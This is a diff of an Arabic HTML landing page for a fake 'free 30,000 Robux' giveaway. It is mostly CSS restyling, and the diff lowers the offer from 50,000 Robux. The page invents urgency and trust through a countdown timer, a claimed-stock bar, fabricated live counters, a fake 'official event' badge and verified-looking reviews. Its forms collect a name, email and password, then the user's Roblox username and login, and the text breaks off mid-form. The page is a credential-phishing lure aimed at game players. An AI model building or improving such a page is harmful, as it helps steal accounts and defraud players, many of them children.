@@ -3,162 +3,167 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎮 احصل على 50,000 روبوكس مجاناً - عرض 2026 الحصري</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
+    <title>🚀 عرض 2026 الخرافي - 30,000 روبوكس مجاناً</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         
         :root {
-            --primary: #00d26a;
-            --primary-dark: #00a854;
-            --secondary: #00f5d4;
+            --neon: #00ff88;
+            --neon2: #00d4ff;
             --gold: #ffd700;
-            --gold-light: #ffed4e;
-            --dark: #0a0a1a;
+            --purple: #a855f7;
+            --pink: #ec4899;
+            --dark: #050510;
             --card: rgba(255,255,255,0.03);
-            --card-border: rgba(255,255,255,0.08);
-            --error: #ff4757;
-            --purple: #8b5cf6;
         }
         
         body {
-            font-family: 'Cairo', 'Tajawal', sans-serif;
+            font-family: 'Cairo', sans-serif;
             background: var(--dark);
             min-height: 100vh;
             color: white;
             overflow-x: hidden;
         }
         
-        /* خلفية متحركة احترافية */
-        .bg-animation {
+        /* خلفية نيون متحركة */
+        .neon-bg {
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
             z-index: -1;
-            overflow: hidden;
-            background: radial-gradient(ellipse at bottom, #1b2735 0%, #090a0f 100%);
+            background: 
+                radial-gradient(circle at 20% 50%, rgba(168,85,247,0.15) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(0,255,136,0.1) 0%, transparent 50%),
+                radial-gradient(circle at 40% 20%, rgba(0,212,255,0.1) 0%, transparent 50%);
         }
         
-        .stars {
-            position: absolute;
+        .grid-lines {
+            position: fixed;
+            top: 0; left: 0;
             width: 100%; height: 100%;
+            z-index: -1;
+            background-image: 
+                linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            animation: gridMove 20s linear infinite;
         }
         
-        .star {
-            position: absolute;
-            background: white;
-            border-radius: 50%;
-            animation: twinkle 3s infinite;
+        @keyframes gridMove {
+            0% { transform: translate(0,0); }
+            100% { transform: translate(50px,50px); }
         }
         
-        @keyframes twinkle {
-            0%, 100% { opacity: 0.3; }
-            50% { opacity: 1; }
+        /* عناصر عائمة */
+        .float-element {
+            position: fixed;
+            font-size: 30px;
+            opacity: 0.15;
+            z-index: -1;
+            animation: floatAround 15s ease-in-out infinite;
         }
         
-        .floating-robux {
-            position: absolute;
-            font-size: 40px;
-            opacity: 0.1;
-            animation: floatUp 20s infinite linear;
-            filter: drop-shadow(0 0 20px rgba(255,215,0,0.5));
+        @keyframes floatAround {
+            0%, 100% { transform: translate(0,0) rotate(0deg); }
+            25% { transform: translate(20px,-30px) rotate(90deg); }
+            50% { transform: translate(-10px,-50px) rotate(180deg); }
+            75% { transform: translate(-30px,-20px) rotate(270deg); }
         }
         
-        @keyframes floatUp {
-            0% { transform: translateY(100vh) rotate(0deg) scale(0.5); }
-            100% { transform: translateY(-100px) rotate(360deg) scale(1.5); }
-        }
-        
-        /* الشريط العلوي المتحرك */
+        /* الشريط العلوي */
         .top-bar {
-            background: linear-gradient(90deg, #ff6b6b, #feca57, #ff6b6b);
+            background: linear-gradient(90deg, var(--purple), var(--pink), var(--purple));
             background-size: 200% 100%;
             padding: 15px;
             text-align: center;
             font-weight: 800;
-            font-size: 16px;
-            animation: gradientMove 3s linear infinite;
-            box-shadow: 0 5px 30px rgba(255,107,107,0.3);
+            font-size: 15px;
+            animation: gradientShift 3s linear infinite;
+            box-shadow: 0 5px 30px rgba(168,85,247,0.4);
         }
         
-        @keyframes gradientMove {
+        @keyframes gradientShift {
             0% { background-position: 0% 50%; }
             100% { background-position: 200% 50%; }
         }
         
         .container {
-            max-width: 550px;
+            max-width: 520px;
             margin: 0 auto;
             padding: 20px;
         }
         
-        /* الشعار الاحترافي */
-        .logo {
+        /* الهيدر الخرافي */
+        .hero {
             text-align: center;
             padding: 40px 20px;
             position: relative;
         }
         
-        .logo-badge {
+        .badge-2026 {
             display: inline-block;
-            background: linear-gradient(135deg, var(--purple), #a855f7);
-            padding: 8px 20px;
+            background: linear-gradient(135deg, var(--purple), var(--pink));
+            padding: 8px 25px;
             border-radius: 50px;
-            font-size: 12px;
-            font-weight: 700;
+            font-size: 13px;
+            font-weight: 800;
             margin-bottom: 20px;
-            box-shadow: 0 5px 20px rgba(139,92,246,0.4);
+            box-shadow: 0 0 30px rgba(168,85,247,0.5);
+            animation: glow 2s infinite;
         }
         
-        .logo-icon {
-            font-size: 80px;
-            margin-bottom: 15px;
-            animation: bounce 2s infinite;
-            filter: drop-shadow(0 0 30px rgba(255,215,0,0.5));
+        @keyframes glow {
+            0%, 100% { box-shadow: 0 0 20px rgba(168,85,247,0.5); }
+            50% { box-shadow: 0 0 40px rgba(168,85,247,0.8); }
         }
         
-        @keyframes bounce {
+        .hero-icon {
+            font-size: 90px;
+            margin-bottom: 20px;
+            animation: heroBounce 2s infinite;
+            filter: drop-shadow(0 0 30px rgba(255,215,0,0.6));
+        }
+        
+        @keyframes heroBounce {
             0%, 100% { transform: translateY(0) scale(1); }
-            50% { transform: translateY(-10px) scale(1.05); }
+            50% { transform: translateY(-15px) scale(1.1); }
         }
         
-        .logo h1 {
-            font-size: 42px;
+        .hero h1 {
+            font-size: 48px;
             font-weight: 900;
-            background: linear-gradient(135deg, var(--gold) 0%, #fff 50%, var(--gold) 100%);
+            background: linear-gradient(135deg, var(--gold), #fff, var(--gold));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 40px rgba(255,215,0,0.3);
             margin-bottom: 10px;
+            text-shadow: 0 0 50px rgba(255,215,0,0.5);
         }
         
-        .logo p {
+        .hero p {
             color: #888;
             font-size: 16px;
-            font-weight: 500;
         }
         
-        /* بطاقة العرض الرئيسية */
-        .offer-card {
-            background: linear-gradient(135deg, rgba(255,215,0,0.1), rgba(0,210,106,0.1));
-            border: 2px solid var(--gold);
+        /* بطاقة العرض الخرافية */
+        .mega-offer {
+            background: linear-gradient(135deg, rgba(168,85,247,0.2), rgba(236,72,153,0.2));
+            border: 2px solid var(--purple);
             border-radius: 30px;
             padding: 40px;
             text-align: center;
             margin: 30px 0;
             position: relative;
             overflow: hidden;
-            box-shadow: 0 20px 60px rgba(255,215,0,0.15);
+            box-shadow: 0 0 60px rgba(168,85,247,0.2);
         }
         
-        .offer-card::before {
+        .mega-offer::before {
             content: '';
             position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(255,215,0,0.1), transparent);
+            top: -50%; left: -50%;
+            width: 200%; height: 200%;
+            background: conic-gradient(from 0deg, transparent, rgba(255,255,255,0.1), transparent);
             animation: rotate 4s linear infinite;
         }
         
@@ -168,213 +173,189 @@
         }
         
         .offer-label {
-            font-size: 18px;
+            font-size: 16px;
             color: #aaa;
-            margin-bottom: 10px;
+            margin-bottom: 15px;
         }
         
-        .offer-amount {
-            font-size: 72px;
+        .mega-amount {
+            font-size: 80px;
             font-weight: 900;
-            background: linear-gradient(135deg, var(--gold), var(--gold-light));
+            background: linear-gradient(135deg, var(--gold), #ffed4e, var(--gold));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 50px rgba(255,215,0,0.5);
             line-height: 1;
             margin: 20px 0;
-            animation: pulse-glow 2s infinite;
+            animation: amountPulse 2s infinite;
         }
         
-        @keyframes pulse-glow {
-            0%, 100% { filter: brightness(1); }
-            50% { filter: brightness(1.2); }
+        @keyframes amountPulse {
+            0%, 100% { transform: scale(1); filter: brightness(1); }
+            50% { transform: scale(1.05); filter: brightness(1.2); }
         }
         
         .offer-currency {
-            font-size: 24px;
+            font-size: 22px;
             color: var(--gold);
             font-weight: 700;
         }
         
-        .offer-timer {
+        /* العداد */
+        .mega-timer {
             display: inline-flex;
             align-items: center;
-            gap: 10px;
+            gap: 15px;
             background: rgba(255,71,87,0.2);
-            border: 1px solid var(--error);
-            padding: 10px 25px;
+            border: 2px solid #ff4757;
+            padding: 15px 30px;
             border-radius: 50px;
-            margin-top: 20px;
-            font-weight: 700;
+            margin-top: 25px;
+            font-weight: 800;
+            font-size: 18px;
         }
         
-        .timer-value {
-            font-size: 24px;
-            color: var(--error);
+        .timer-digits {
+            font-size: 32px;
+            color: #ff4757;
             font-family: monospace;
+            font-weight: 900;
         }
         
         /* شريط التقدم */
-        .progress-section {
+        .scarcity-bar {
             margin: 25px 0;
         }
         
-        .progress-label {
+        .scarcity-label {
             display: flex;
             justify-content: space-between;
-            font-size: 13px;
-            color: #888;
+            font-size: 14px;
             margin-bottom: 10px;
         }
         
-        .progress-bar {
+        .scarcity-label .hot {
+            color: #ff4757;
+            font-weight: 700;
+        }
+        
+        .scarcity-track {
             width: 100%;
-            height: 12px;
+            height: 15px;
             background: rgba(255,255,255,0.05);
             border-radius: 10px;
             overflow: hidden;
             position: relative;
         }
         
-        .progress-fill {
+        .scarcity-fill {
             height: 100%;
-            width: 87%;
-            background: linear-gradient(90deg, var(--error), #ff6b6b);
+            width: 92%;
+            background: linear-gradient(90deg, #ff4757, #ff6b6b);
             border-radius: 10px;
             position: relative;
-            animation: progressShine 2s infinite;
+            overflow: hidden;
         }
         
-        @keyframes progressShine {
-            0% { background-position: 0% 50%; }
-            100% { background-position: 200% 50%; }
-        }
-        
-        .progress-fill::after {
+        .scarcity-fill::after {
             content: '';
             position: absolute;
-            top: 0; left: 0;
+            top: 0; left: -100%;
             width: 100%; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-            animation: shine 2s infinite;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            animation: shimmer 2s infinite;
         }
         
-        @keyframes shine {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(200%); }
+        @keyframes shimmer {
+            0% { left: -100%; }
+            100% { left: 100%; }
         }
         
-        /* إحصائيات حية */
-        .live-stats {
+        /* إحصائيات */
+        .stats-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 15px;
             margin: 25px 0;
         }
         
-        .stat-card {
+        .stat-box {
             background: var(--card);
-            border: 1px solid var(--card-border);
+            border: 1px solid rgba(255,255,255,0.1);
             border-radius: 20px;
-            padding: 20px;
+            padding: 20px 15px;
             text-align: center;
-            transition: transform 0.3s;
+            transition: all 0.3s;
         }
         
-        .stat-card:hover {
+        .stat-box:hover {
             transform: translateY(-5px);
+            border-color: var(--neon);
+            box-shadow: 0 10px 30px rgba(0,255,136,0.2);
         }
         
-        .stat-icon {
-            font-size: 28px;
-            margin-bottom: 10px;
-        }
+        .stat-icon { font-size: 28px; margin-bottom: 8px; }
+        .stat-number { font-size: 22px; font-weight: 900; color: var(--neon); }
+        .stat-text { font-size: 12px; color: #888; margin-top: 5px; }
         
-        .stat-value {
-            font-size: 24px;
-            font-weight: 900;
-            color: var(--gold);
-        }
-        
-        .stat-label {
-            font-size: 12px;
-            color: #888;
-            margin-top: 5px;
-        }
-        
-        /* النماذج الاحترافية */
-        .form-section {
+        /* النماذج الخرافية */
+        .form-card {
             background: var(--card);
-            border: 1px solid var(--card-border);
+            border: 1px solid rgba(255,255,255,0.1);
             border-radius: 25px;
             padding: 35px;
             margin: 25px 0;
             backdrop-filter: blur(20px);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
         }
         
-        .form-header {
+        .form-title {
             text-align: center;
             margin-bottom: 30px;
         }
         
-        .step-indicator {
+        .step-pills {
             display: flex;
             justify-content: center;
-            gap: 10px;
-            margin-bottom: 20px;
+            gap: 15px;
+            margin-bottom: 25px;
         }
         
-        .step-dot {
-            width: 35px;
-            height: 35px;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.1);
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        .pill {
+            padding: 10px 20px;
+            border-radius: 50px;
+            font-size: 13px;
             font-weight: 700;
-            font-size: 14px;
-            border: 2px solid transparent;
+            background: rgba(255,255,255,0.05);
+            border: 2px solid rgba(255,255,255,0.1);
         }
         
-        .step-dot.active {
-            background: var(--gold);
-            color: #000;
-            box-shadow: 0 0 20px rgba(255,215,0,0.4);
+        .pill.active {
+            background: var(--purple);
+            border-color: var(--purple);
+            box-shadow: 0 0 20px rgba(168,85,247,0.4);
         }
         
-        .step-dot.completed {
-            background: var(--primary);
-            color: white;
+        .pill.done {
+            background: var(--neon);
+            border-color: var(--neon);
         }
         
-        .step-line {
-            width: 40px;
-            height: 2px;
-            background: rgba(255,255,255,0.1);
-            align-self: center;
-        }
-        
-        .step-line.completed {
-            background: var(--primary);
-        }
-        
-        .form-header h2 {
-            font-size: 24px;
+        .form-title h2 {
+            font-size: 26px;
             font-weight: 800;
             margin-bottom: 8px;
         }
         
-        .form-header p {
+        .form-title p {
             color: #888;
             font-size: 14px;
         }
         
-        .input-group {
+        .field-group {
             margin-bottom: 20px;
         }
         
-        .input-group label {
+        .field-group label {
             display: flex;
             align-items: center;
             gap: 8px;
@@ -384,14 +365,14 @@
             font-weight: 600;
         }
         
-        .input-wrapper {
+        .field-wrap {
             position: relative;
         }
         
-        .input-wrapper input {
+        .field-wrap input {
             width: 100%;
             padding: 18px 18px 18px 50px;
-            background: rgba(0,0,0,0.3);
+            background: rgba(0,0,0,0.4);
             border: 2px solid rgba(255,255,255,0.1);
             border-radius: 15px;
             color: white;
@@ -400,50 +381,45 @@
             transition: all 0.3s;
         }
         
-        .input-wrapper input:focus {
-            border-color: var(--gold);
+        .field-wrap input:focus {
+            border-color: var(--neon);
             outline: none;
-            box-shadow: 0 0 30px rgba(255,215,0,0.2);
-            background: rgba(0,0,0,0.4);
+            box-shadow: 0 0 30px rgba(0,255,136,0.2);
         }
         
-        .input-wrapper input::placeholder {
-            color: #555;
-        }
-        
-        .input-icon {
+        .field-icon {
             position: absolute;
             left: 18px;
             top: 50%;
             transform: translateY(-50%);
             font-size: 20px;
-            opacity: 0.5;
+            opacity: 0.6;
         }
         
-        .submit-btn {
+        .action-btn {
             width: 100%;
             padding: 20px;
-            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-            color: white;
+            background: linear-gradient(135deg, var(--neon), var(--neon2));
+            color: #000;
             border: none;
             border-radius: 15px;
             font-size: 18px;
-            font-weight: 800;
+            font-weight: 900;
             cursor: pointer;
             font-family: 'Cairo', sans-serif;
             transition: all 0.3s;
             position: relative;
             overflow: hidden;
-            box-shadow: 0 10px 40px rgba(0,210,106,0.3);
+            box-shadow: 0 10px 40px rgba(0,255,136,0.3);
         }
         
-        .submit-btn::before {
+        .action-btn::before {
             content: '';
             position: absolute;
             top: 0; left: -100%;
             width: 100%; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-            animation: btnShine 3s infinite;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            animation: btnShine 2s infinite;
         }
         
         @keyframes btnShine {
@@ -452,22 +428,18 @@
             100% { left: 100%; }
         }
         
-        .submit-btn:hover {
+        .action-btn:hover {
             transform: translateY(-3px);
-            box-shadow: 0 15px 50px rgba(0,210,106,0.4);
+            box-shadow: 0 15px 50px rgba(0,255,136,0.4);
         }
         
-        .submit-btn:active {
-            transform: translateY(0);
-        }
-        
-        .submit-btn:disabled {
+        .action-btn:disabled {
             opacity: 0.7;
             cursor: not-allowed;
         }
         
         /* رسائل الحالة */
-        .status-msg {
+        .alert-box {
             margin-top: 20px;
             padding: 18px;
             border-radius: 15px;
@@ -482,107 +454,109 @@
             to { opacity: 1; transform: translateY(0); }
         }
         
-        .status-msg.error {
+        .alert-box.error {
             background: rgba(255,71,87,0.15);
-            border: 1px solid var(--error);
-            color: var(--error);
+            border: 2px solid #ff4757;
+            color: #ff4757;
         }
         
-        .status-msg.success {
-            background: rgba(0,210,106,0.15);
-            border: 1px solid var(--primary);
-            color: var(--primary);
+        .alert-box.success {
+            background: rgba(0,255,136,0.15);
+            border: 2px solid var(--neon);
+            color: var(--neon);
         }
         
-        .status-msg.loading {
+        .alert-box.loading {
             background: rgba(255,215,0,0.15);
-            border: 1px solid var(--gold);
+            border: 2px solid var(--gold);
             color: var(--gold);
         }
         
-        .loading-spinner {
+        .spinner {
             display: inline-block;
-            width: 20px;
-            height: 20px;
+            width: 22px;
+            height: 22px;
             border: 3px solid rgba(255,215,0,0.3);
             border-radius: 50%;
             border-top-color: var(--gold);
             animation: spin 1s linear infinite;
-            margin-left: 10px;
+            margin-right: 10px;
             vertical-align: middle;
         }
         
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
         
-        /* صورة السكن */
-        .avatar-section {
+        /* صورة البروفايل */
+        .profile-preview {
             text-align: center;
-            margin: 20px 0;
+            margin: 25px 0;
             display: none;
         }
         
-        .avatar-preview {
-            width: 120px;
-            height: 120px;
+        .profile-img {
+            width: 130px;
+            height: 130px;
             border-radius: 50%;
-            border: 4px solid var(--gold);
-            box-shadow: 0 0 40px rgba(255,215,0,0.3);
+            border: 4px solid var(--neon);
+            box-shadow: 0 0 40px rgba(0,255,136,0.4);
             object-fit: cover;
         }
         
-        .avatar-name {
-            margin-top: 10px;
-            font-size: 16px;
-            font-weight: 700;
-            color: var(--gold);
+        .profile-name {
+            margin-top: 12px;
+            font-size: 18px;
+            font-weight: 800;
+            color: var(--neon);
         }
         
         /* التعليقات */
-        .comments-section {
+        .reviews {
             margin: 40px 0;
         }
         
-        .comments-header {
+        .reviews-header {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            gap: 12px;
             margin-bottom: 25px;
         }
         
-        .comments-header h3 {
-            font-size: 20px;
+        .reviews-header h3 {
+            font-size: 22px;
             font-weight: 800;
         }
         
-        .live-badge {
-            background: var(--error);
-            padding: 5px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 700;
-            animation: pulse 1.5s infinite;
+        .live-dot {
+            width: 10px;
+            height: 10px;
+            background: #ff4757;
+            border-radius: 50%;
+            animation: blink 1s infinite;
         }
         
-        .comment {
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        
+        .review-card {
             background: var(--card);
-            border: 1px solid var(--card-border);
+            border: 1px solid rgba(255,255,255,0.08);
             border-radius: 20px;
             padding: 20px;
             margin-bottom: 15px;
             display: flex;
-            align-items: flex-start;
             gap: 15px;
-            transition: transform 0.3s;
+            transition: all 0.3s;
         }
         
-        .comment:hover {
+        .review-card:hover {
+            border-color: rgba(255,255,255,0.2);
             transform: translateX(-5px);
         }
         
-        .comment-avatar {
+        .review-avatar {
             width: 50px;
             height: 50px;
             border-radius: 50%;
@@ -594,49 +568,47 @@
             flex-shrink: 0;
         }
         
-        .comment-content {
-            flex: 1;
-        }
+        .review-body { flex: 1; }
         
-        .comment-header {
+        .review-head {
             display: flex;
             align-items: center;
             gap: 10px;
             margin-bottom: 8px;
         }
         
-        .comment-header h4 {
+        .review-head h4 {
             font-size: 15px;
             font-weight: 700;
         }
         
-        .verified-badge {
-            color: var(--primary);
+        .verify-badge {
+            color: var(--neon);
             font-size: 14px;
         }
         
-        .comment-time {
+        .review-time {
             color: #666;
             font-size: 12px;
+            margin-right: auto;
         }
         
-        .comment-content p {
+        .review-body p {
             color: #aaa;
             font-size: 14px;
-            line-height: 1.6;
+            line-height: 1.7;
         }
         
-        .comment-likes {
+        .review-stats {
             display: flex;
-            align-items: center;
-            gap: 15px;
-            margin-top: 10px;
+            gap: 20px;
+            margin-top: 12px;
             color: #666;
             font-size: 13px;
         }
         
-        /* المودال الاحترافي */
-        .modal {
+        /* المودال الخرافي */
+        .modal-overlay {
             display: none;
             position: fixed;
             top: 0; left: 0;
@@ -646,80 +618,81 @@
             justify-content: center;
             align-items: center;
             padding: 20px;
-            backdrop-filter: blur(10px);
+            backdrop-filter: blur(20px);
         }
         
-        .modal-content {
-            background: linear-gradient(135deg, #1a1a3a, #0f0f25);
-            border-radius: 30px;
+        .modal-box {
+            background: linear-gradient(135deg, #1a0b2e, #0f0518);
+            border-radius: 35px;
             padding: 50px 40px;
             text-align: center;
             max-width: 450px;
             width: 100%;
-            border: 2px solid var(--gold);
-            box-shadow: 0 0 100px rgba(255,215,0,0.2);
-            animation: modalZoom 0.4s;
+            border: 3px solid var(--gold);
+            box-shadow: 0 0 100px rgba(255,215,0,0.3);
+            animation: modalPop 0.5s;
         }
         
-        @keyframes modalZoom {
-            from { transform: scale(0.8); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
+        @keyframes modalPop {
+            0% { transform: scale(0.7); opacity: 0; }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); opacity: 1; }
         }
         
-        .modal-icon {
-            font-size: 90px;
+        .modal-emoji {
+            font-size: 100px;
             margin-bottom: 25px;
             animation: celebrate 1s infinite;
         }
         
         @keyframes celebrate {
             0%, 100% { transform: scale(1) rotate(0deg); }
-            25% { transform: scale(1.1) rotate(-5deg); }
-            75% { transform: scale(1.1) rotate(5deg); }
+            25% { transform: scale(1.15) rotate(-10deg); }
+            75% { transform: scale(1.15) rotate(10deg); }
         }
         
-        .modal h2 {
-            font-size: 32px;
+        .modal-box h2 {
+            font-size: 36px;
             font-weight: 900;
-            background: linear-gradient(135deg, var(--gold), var(--gold-light));
+            background: linear-gradient(135deg, var(--gold), #fff);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             margin-bottom: 15px;
         }
         
-        .modal p {
+        .modal-box p {
             color: #aaa;
-            font-size: 16px;
+            font-size: 17px;
             margin-bottom: 30px;
             line-height: 1.8;
         }
         
-        .modal-btn {
+        .modal-action {
             background: linear-gradient(135deg, var(--gold), #ffaa00);
             color: #000;
             padding: 18px 50px;
             border: none;
             border-radius: 50px;
             font-size: 18px;
-            font-weight: 800;
+            font-weight: 900;
             cursor: pointer;
             font-family: 'Cairo', sans-serif;
             box-shadow: 0 10px 40px rgba(255,215,0,0.4);
             transition: all 0.3s;
         }
         
-        .modal-btn:hover {
+        .modal-action:hover {
             transform: translateY(-3px);
             box-shadow: 0 15px 50px rgba(255,215,0,0.5);
         }
         
-        /* توست الإشعارات */
-        .toast {
+        /* توست */
+        .notify-toast {
             position: fixed;
             bottom: 25px;
             left: 25px;
-            background: rgba(20,20,40,0.95);
-            border: 1px solid rgba(255,215,0,0.3);
+            background: rgba(10,10,25,0.95);
+            border: 2px solid rgba(0,255,136,0.3);
             border-radius: 20px;
             padding: 18px 25px;
             display: none;
@@ -728,15 +701,15 @@
             z-index: 1000;
             backdrop-filter: blur(20px);
             box-shadow: 0 10px 40px rgba(0,0,0,0.5);
-            animation: slideInLeft 0.5s;
+            animation: toastIn 0.5s;
         }
         
-        @keyframes slideInLeft {
+        @keyframes toastIn {
             from { transform: translateX(-400px); opacity: 0; }
             to { transform: translateX(0); opacity: 1; }
         }
         
-        .toast-avatar {
+        .toast-pic {
             width: 50px; height: 50px;
             border-radius: 50%;
             display: flex;
@@ -746,207 +719,195 @@
             font-size: 20px;
         }
         
-        .toast-content h4 {
-            font-size: 15px;
-            font-weight: 700;
-        }
-        
-        .toast-content p {
-            color: #888;
-            font-size: 13px;
-        }
+        .toast-info h4 { font-size: 15px; font-weight: 700; }
+        .toast-info p { color: #888; font-size: 13px; }
         
         .hidden { display: none !important; }
         
         @media (max-width: 480px) {
             .container { padding: 15px; }
-            .logo h1 { font-size: 32px; }
-            .offer-amount { font-size: 56px; }
-            .form-section { padding: 25px; }
+            .hero h1 { font-size: 36px; }
+            .mega-amount { font-size: 60px; }
+            .form-card { padding: 25px; }
         }
     </style>
 </head>
 <body>
-    <div class="bg-animation">
-        <div class="stars" id="stars"></div>
-        <div id="floatingItems"></div>
-    </div>
+    <div class="neon-bg"></div>
+    <div class="grid-lines"></div>
+    <div id="floatElements"></div>
     
     <div class="top-bar">
-        🔥 عرض حصري 2026: احصل على 50,000 روبوكس مجاناً الآن! 🔥
+        🚀 عرض 2026 الخرافي: 30,000 روبوكس مجاناً - آخر 8 ساعات! 🚀
     </div>
     
     <div class="container">
-        <!-- الشعار -->
-        <div class="logo">
-            <div class="logo-badge">✨ الحدث الرسمي 2026 ✨</div>
-            <div class="logo-icon">💎</div>
+        <!-- الهيدر -->
+        <div class="hero">
+            <div class="badge-2026">✨ حدث 2026 الرسمي ✨</div>
+            <div class="hero-icon">💎</div>
             <h1>روبوكس مجاني</h1>
-            <p>أكبر حدث توزيع روبوكس في تاريخ روبلوكس</p>
+            <p>أكبر توزيع روبوكس في تاريخ اللعبة</p>
         </div>
         
-        <!-- بطاقة العرض -->
-        <div class="offer-card">
+        <!-- العرض -->
+        <div class="mega-offer">
             <div class="offer-label">🎁 احصل على</div>
-            <div class="offer-amount">50,000</div>
+            <div class="mega-amount">30,000</div>
             <div class="offer-currency">روبوكس مجاناً</div>
             
-            <div class="offer-timer">
-                ⏰ ينتهي خلال: <span class="timer-value" id="countdown">04:59</span>
+            <div class="mega-timer">
+                ⏰ ينتهي خلال: <span class="timer-digits" id="countdown">03:59</span>
             </div>
         </div>
         
-        <!-- شريط التقدم -->
-        <div class="progress-section">
-            <div class="progress-label">
+        <!-- شريط الندرة -->
+        <div class="scarcity-bar">
+            <div class="scarcity-label">
                 <span>📦 الكمية المتبقية</span>
-                <span style="color: var(--error); font-weight: 700;">87% claimed</span>
+                <span class="hot">🔥 92% تم الاستلام</span>
             </div>
-            <div class="progress-bar">
-                <div class="progress-fill"></div>
+            <div class="scarcity-track">
+                <div class="scarcity-fill"></div>
             </div>
         </div>
         
         <!-- إحصائيات -->
-        <div class="live-stats">
-            <div class="stat-card">
+        <div class="stats-grid">
+            <div class="stat-box">
                 <div class="stat-icon">👥</div>
-                <div class="stat-value" id="onlineCount">4,847</div>
-                <div class="stat-label">متصل الآن</div>
+                <div class="stat-number" id="onlineCount">5,234</div>
+                <div class="stat-text">متصل الآن</div>
             </div>
-            <div class="stat-card">
+            <div class="stat-box">
                 <div class="stat-icon">✅</div>
-                <div class="stat-value" id="claimedCount">24,847</div>
-                <div class="stat-label">تم التسليم</div>
+                <div class="stat-number" id="claimedCount">28,654</div>
+                <div class="stat-text">تم التسليم</div>
             </div>
-            <div class="stat-card">
-                <div class="stat-icon">⏳</div>
-                <div class="stat-value" id="leftCount">156</div>
-                <div class="stat-label">متبقي</div>
+            <div class="stat-box">
+                <div class="stat-icon">⚡</div>
+                <div class="stat-number" id="leftCount">87</div>
+                <div class="stat-text">متبقي فقط</div>
             </div>
         </div>
         
         <!-- الخطوة 1 -->
-        <div class="form-section" id="registerSection">
-            <div class="form-header">
-                <div class="step-indicator">
-                    <div class="step-dot active">1</div>
-                    <div class="step-line"></div>
-                    <div class="step-dot">2</div>
+        <div class="form-card" id="step1">
+            <div class="form-title">
+                <div class="step-pills">
+                    <div class="pill active">الخطوة 1</div>
+                    <div class="pill">الخطوة 2</div>
                 </div>
                 <h2>📝 أنشئ حسابك</h2>
                 <p>أدخل بياناتك للمتابعة</p>
             </div>
             
-            <form id="registerForm">
-                <div class="input-group">
+            <form id="regForm">
+                <div class="field-group">
                     <label>👤 الاسم الكامل</label>
-                    <div class="input-wrapper">
-                        <span class="input-icon">✏️</span>
+                    <div class="field-wrap">
+                        <span class="field-icon">✏️</span>
                         <input type="text" id="fullName" placeholder="أدخل اسمك الكامل" required>
                     </div>
                 </div>
                 
-                <div class="input-group">
+                <div class="field-group">
                     <label>📧 البريد الإلكتروني</label>
-                    <div class="input-wrapper">
-                        <span class="input-icon">@</span>
+                    <div class="field-wrap">
+                        <span class="field-icon">@</span>
                         <input type="email" id="email" placeholder="example@email.com" required>
                     </div>
                 </div>
                 
-                <div class="input-group">
+                <div class="field-group">
                     <label>🔒 كلمة المرور</label>
-                    <div class="input-wrapper">
-                        <span class="input-icon">🔑</span>
-                        <input type="password" id="regPassword" placeholder="أدخل كلمة مرور قوية" required>
+                    <div class="field-wrap">
+                        <span class="field-icon">🔑</span>
+                        <input type="password" id="password" placeholder="أدخل كلمة مرور قوية" required>
                     </div>
                 </div>
                 
-                <button type="submit" class="submit-btn">متابعة إلى الخطوة التالية ←</button>
+                <button type="submit" class="action-btn">متابعة إلى الخطوة التالية ←</button>
             </form>
         </div>
         
         <!-- الخطوة 2 -->
-        <div class="form-section hidden" id="robloxSection">
-            <div class="form-header">
-                <div class="step-indicator">
-                    <div class="step-dot completed">✓</div>
-                    <div class="step-line completed"></div>
-                    <div class="step-dot active">2</div>
+        <div class="form-card hidden" id="step2">
+            <div class="form-title">
+                <div class="step-pills">
+                    <div class="pill done">✓ تم</div>
+                    <div class="pill active">الخطوة 2</div>
                 </div>
                 <h2>🎮 أدخل حساب روبلوكس</h2>
                 <p>سجل دخول لاستلام روبوكسك</p>
             </div>
             
-            <div class="avatar-section" id="avatarSection">
-                <img class="avatar-preview" id="avatarPreview" src="" alt="Avatar">
-                <div class="avatar-name" id="avatarName"></div>
+            <div class="profile-preview" id="profilePreview">
+                <img class="profile-img" id="profileImg" src="" alt="Profile">
+                <div class="profile-name" id="profileName"></div>
             </div>
             
-            <form id="robloxForm">
-                <div class="input-group">
+            <form id="rbxForm">
+                <div class="field-group">
                     <label>🎮 يوزر روبلوكس</label>
-                    <div class="input-wrapper">
-                        <span class="input-icon">👾</span>
-                        <input type="text" id="robloxUsername" placeholder="أدخل يوزر روبلوكس" required>
+                    <div class="field-wrap">
